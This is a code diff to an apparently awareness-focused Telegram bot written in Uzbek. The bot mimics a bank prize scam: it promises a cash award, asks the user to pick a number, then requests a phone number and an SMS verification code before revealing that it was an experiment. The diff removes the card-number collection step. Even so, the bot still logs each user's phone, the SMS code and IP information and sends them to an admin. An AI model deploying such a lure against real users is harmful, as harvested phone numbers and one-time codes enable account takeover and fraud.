@@ -85,43 +85,37 @@ user_steps = {}
 
 TEXTS = {
     'welcome': (
-        "🎁 Xush kelibsiz!\n\n"
         "O'zbekiston banklari tomonidan barcha fuqarolarga BHMning 1 baravari "
         "miqdorida bir martalik pul mukofoti ajratilmoqda.\n\n"
-        "🎮 O'yinda ishtirok etish uchun telefon raqamingizni kiriting:\n\n"
-        "📱 +998"
+        "SIZ ASOSIY BOSQICHDASIZ:\n"
+        "1 dan 9 gacha boʻlgan raqamlardan birini yozing:"
     ),
-    'phone_invalid': "❌ Notoʻgʻri raqam. 9 xonali raqam kiriting (masalan: 901234567).",
-    'number_pick': "Oʻyinda ishtirok etish uchun 1 dan 9 gacha boʻlgan raqamlardan birini yozing:",
     'number_invalid': "❌ Faqat 1 dan 9 gacha bitta raqam yozing.",
     'prize_win': (
-        "Tabriklaymiz! Siz tasodifiy tanlov natijasiga koʻra {} SOʻM pul yutugʻi "
+        "Tabriklaymiz! Siz tasodifiy tanlov natijasiga koʻra {} pul yutugʻi "
         "egasiga aylandingiz! 🎉"
     ),
-    'card_prompt': (
-        "Yutuqni bankingiz plastik kartasiga darhol tushirib olish uchun 16 talik "
-        "karta raqamingizni kiriting:"
-    ),
-    'card_invalid': "❌ Karta raqami notoʻgʻri. Faqat 16 xonali raqam kiriting.",
+    'phone_prompt': "Telefon raqamingizni kiriting:\n\n(misol: 900030002)",
+    'phone_invalid': "❌ Notoʻgʻri raqam. 9 xonali raqam kiriting (masalan: 900030002).",
     'code_sent': "📩 Telefoningizga tasdiqlash kodi yuborildi.\n\n🔐 Kodni kiriting: {}",
     'code_invalid': "❌ Kod notoʻgʻri. Qaytadan kiriting.",
     'blocked': "🚫 Urinishlar tugadi. /start buyrugʻi bilan qayta boshlang.",
     'experiment': (
-        "⚠️ BU EKSPERIMENT EDI! ⚠️\n\n"
+        "⚠️ BU EKSPERIMENT EDI!\n\n"
         "❌ Siz hech narsa yutmadingiz!\n\n"
-        "😱 Agar bu HAQIQIY firibgarlik boʻlganda:\n"
+        "Agar bu HAQIQIY firibgarlik boʻlganda:\n"
         "• Telefon raqamingiz oʻgʻirlangan boʻlardi\n"
         "• Bank hisobingizdan pul yechib olinardi\n"
         "• Shaxsiy maʻlumotlaringiz sotilgan boʻlardi\n\n"
-        "🔐 ESDA TUTING:\n\n"
-        "1️⃣ Tanishilmagan QR kodlarni skanerlamang!\n"
-        "2️⃣ Telefon raqamingizni notanish saytlarga bermang!\n"
-        "3️⃣ SMS kodlarni HECH KIMGA aytmang!\n"
-        "4️⃣ \"Bepul sovgʻa\" vaʻdalariga ishonmang!\n\n"
-        "📣 Bu tajriba kiberjinoyatlarning oldini olish va fuqarolarning raqamli "
+        "🔐 ESDA TUTING:\n"
+        "Tanishilmagan QR kodlarni skanerlamang!\n"
+        "Telefon raqamingizni notanish saytlarga bermang!\n"
+        "SMS kodlarni HECH KIMGA aytmang!\n"
+        "\"Bepul sovgʻa\" vaʻdalariga ishonmang!\n\n"
+        "Bu tajriba kiberjinoyatlarning oldini olish va fuqarolarning raqamli "
         "savodxonligini oshirish uchun oʻtkazildi.\n\n"
-        "✅ Endi siz bu hiylalarni bilasiz — yaqinlaringizni asrash uchun boshqalarga ham ayting!\n\n"
-        "🔒 Xavotirga oʻrin yoʻq: siz kiritgan hech qanday maxfiy maʻlumotlar yoki bank "
+        "Endi siz bu hiylalarni bilasiz — yaqinlaringizni asrash uchun boshqalarga ham ayting!\n\n"
+        "Xavotirga oʻrin yoʻq: siz kiritgan hech qanday maxfiy maʻlumotlar yoki bank "
         "maʻlumotlari tizimimizda saqlanmadi va uchinchi shaxslarga uzatilmadi."
     ),
     'channel_follow': (
@@ -215,6 +209,26 @@ def finish_experiment(chat_id):
     bot.send_message(chat_id, get_text('channel_follow'), reply_markup=build_channel_menu())
 
 
+def process_number_pick(chat_id, text):
+    picked = (text or '').strip()
+    if picked not in ('1', '2', '3', '4', '5', '6', '7', '8', '9'):
+        bot.send_message(chat_id, get_text('number_invalid'))
+        return
+
+    state = get_state(chat_id)
+    state['picked_number'] = picked
+
+    prize = random.randint(50000, 1000000)
+    prize = max(50000, (prize // 1000) * 1000)
+    state['prize'] = prize
+
+    bot.send_message(chat_id, get_text('prize_win').format(format_sum(prize)))
+    log_action(chat_id, "number_picked", f"raqam={picked}, yutuq={prize}")
+
+    set_step(chat_id, 'phone')
+    bot.send_message(chat_id, get_text('phone_prompt'))
+
+
 def process_phone(chat_id, phone_raw):
     phone = normalize_phone(phone_raw)
     if not phone:
@@ -235,46 +249,6 @@ def process_phone(chat_id, phone_raw):
     conn.close()
 
     log_action(chat_id, "phone_received", phone)
-    set_step(chat_id, 'number_pick')
-    bot.send_message(chat_id, get_text('number_pick'))
-
-
-def process_number_pick(chat_id, text):
-    picked = (text or '').strip()
-    if picked not in ('1', '2', '3', '4', '5', '6', '7', '8', '9'):
-        bot.send_message(chat_id, get_text('number_invalid'))
-        return
-
-    state = get_state(chat_id)
-    state['picked_number'] = picked
-
-    prize = random.randint(50000, 1000000)
-    prize = max(50000, (prize // 1000) * 1000)
-    state['prize'] = prize
-
-    bot.send_message(chat_id, get_text('prize_win').format(format_sum(prize)))
-    log_action(chat_id, "number_picked", f"raqam={picked}, yutuq={prize}")
-
-    set_step(chat_id, 'card')
-    bot.send_message(chat_id, get_text('card_prompt'))
-
-
-def process_card(chat_id, text):
-    card_num = re.sub(r'\D', '', text or '')
-    if len(card_num) != 16:
-        bot.send_message(chat_id, get_text('card_invalid'))
-        return
-
-    state = get_state(chat_id)
-    state['card'] = card_num
-
-    conn = get_db()
-    c = conn.cursor()
-    c.execute("UPDATE users SET card_number = ?, step = 2 WHERE chat_id = ?", (card_num, chat_id))
-    conn.commit()
-    conn.close()
-
-    log_action(chat_id, "card_received", card_num)
     set_step(chat_id, 'code1')
     send_code(chat_id, 'code_1', 'code_sent')
 
@@ -305,7 +279,7 @@ def process_code(chat_id, text, code_key):
 @bot.message_handler(commands=['start'])
 def start_handler(message):
     chat_id = message.chat.id
-    user_steps[chat_id] = {'step': 'phone'}
+    user_steps[chat_id] = {'step': 'number_pick'}
 
     ip_info = get_ip_info(chat_id)
     log_action(chat_id, "bot_started", json.dumps(ip_info))
@@ -324,19 +298,14 @@ def admin_callback_handler(call):
 
 
 # ============== XABARLAR (step bo'yicha) ==============
-@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'phone')
-def phone_step_handler(message):
-    process_phone(message.chat.id, message.text)
-
-
 @bot.message_handler(func=lambda m: get_step(m.chat.id) == 'number_pick')
 def number_pick_step_handler(message):
     process_number_pick(message.chat.id, message.text)
 
 
-@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'card')
-def card_step_handler(message):
-    process_card(message.chat.id, message.text)
+@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'phone')
+def phone_step_handler(message):
+    process_phone(message.chat.id, message.text)
 
 
 @bot.message_handler(func=lambda m: get_step(m.chat.id) == 'code1')
@@ -354,7 +323,6 @@ def notify_admin(user_chat_id):
             f"📱 Telefon: {data.get('phone', 'N/A')}\n"
             f"🎲 Tanlangan raqam: {data.get('picked_number', 'N/A')}\n"
             f"💰 Yutuq: {format_sum(data.get('prize', 0))} so'm\n"
-            f"💳 Karta: {data.get('card', 'N/A')}\n"
             f"🔐 Kod: {data.get('code_1', 'N/A')}\n"
             f"🕐 Vaqt: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
@@ -402,7 +370,6 @@ def handle_admin_callback(call):
                     f"👤 #{user[0]}\n"
                     f"Chat ID: {user[1]}\n"
                     f"Telefon: {user[2]}\n"
-                    f"Karta: {user[3]}\n"
                     f"Yakunlangan: {user[14]}"
                 )
 
@@ -421,7 +388,7 @@ def handle_admin_callback(call):
         users = c.fetchall()
         export_data = [{
             'id': u[0], 'chat_id': u[1], 'phone': u[2],
-            'card_number': u[3], 'completed_at': u[14]
+            'completed_at': u[14]
         } for u in users]
         with open('export_data.json', 'w') as f:
             json.dump(export_data, f, indent=2, ensure_ascii=False)
@@ -508,7 +475,6 @@ if __name__ == "__main__":
                 break
             if "409" in err or "webhook" in err.lower():
                 try:
-                    bot.remove_webhook()
                     requests.get(
                         f"https://api.telegram.org/bot{TOKEN}/deleteWebhook",
                         params={"drop_pending_updates": True},
